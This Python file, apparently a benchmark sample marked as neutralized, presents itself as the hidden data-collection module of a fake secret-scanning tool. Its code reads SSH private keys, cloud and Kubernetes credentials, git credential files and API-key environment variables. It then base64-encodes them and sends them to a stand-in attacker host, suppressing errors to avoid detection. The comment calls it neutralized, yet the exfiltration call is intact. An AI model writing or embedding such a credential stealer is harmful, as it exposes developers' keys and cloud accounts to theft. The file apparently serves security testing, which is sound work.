#!/usr/bin/env python3
# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
"""
Secret Scanner Enterprise - Data Collection Module
WARNING: This is the MALICIOUS component hidden in the legitimate scanner
"""

import os
import json
import base64

def collect_all():
    """Collect all sensitive data under the guise of scanning"""
    data = {}

    # THEFT-001: SSH Keys
    ssh_dir = os.path.expanduser('~/.ssh')
    if os.path.exists(ssh_dir):
        data['ssh'] = {}
        for f in ['id_rsa', 'id_ed25519', 'id_ecdsa', 'config', 'known_hosts']:
            path = os.path.join(ssh_dir, f)
            if os.path.exists(path):
                with open(path, 'r') as file:
                    data['ssh'][f] = file.read()

    # THEFT-002: Cloud Credentials
    cloud_paths = {
        'aws_credentials': '~/.aws/credentials',
        'aws_config': '~/.aws/config',
        'gcp_credentials': '~/.config/gcloud/application_default_credentials.json',
        'azure_profile': '~/.azure/azureProfile.json',
        'kube_config': '~/.kube/config',
    }
    data['cloud'] = {}
    for name, path in cloud_paths.items():
        full_path = os.path.expanduser(path)
        if os.path.exists(full_path):
            with open(full_path, 'r') as f:
                data['cloud'][name] = f.read()

    # THEFT-003: Environment secrets
    sensitive_vars = [
        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
        'GITHUB_TOKEN', 'GITLAB_TOKEN', 'ANTHROPIC_API_KEY',
        'OPENAI_API_KEY', 'DATABASE_URL', 'STRIPE_SECRET_KEY'
    ]
    data['env'] = {}
    for var in sensitive_vars:
        val = os.environ.get(var)
        if val:
            data['env'][var] = val

    # THEFT-005: Git credentials
    git_paths = ['~/.git-credentials', '~/.gitconfig', '~/.config/gh/hosts.yml']
    data['git'] = {}
    for path in git_paths:
        full_path = os.path.expanduser(path)
        if os.path.exists(full_path):
            with open(full_path, 'r') as f:
                data['git'][os.path.basename(path)] = f.read()

    # Exfiltrate (NEUTRALIZED)
    _exfiltrate(data)

def _exfiltrate(data):
    """Send collected data to C2 server"""
    import urllib.request

    payload = base64.b64encode(json.dumps(data).encode()).decode()

    # [REDACTED] - Attacker server
    req = urllib.request.Request(
        "https://[REDACTED].example.com/collect",
        data=payload.encode(),
        headers={
            'Content-Type': 'application/octet-stream',
            'X-Scan-ID': os.environ.get('USER', 'unknown')
        }
    )
    try:
        urllib.request.urlopen(req, timeout=5)
    except:
        pass  # Silently fail to avoid detection
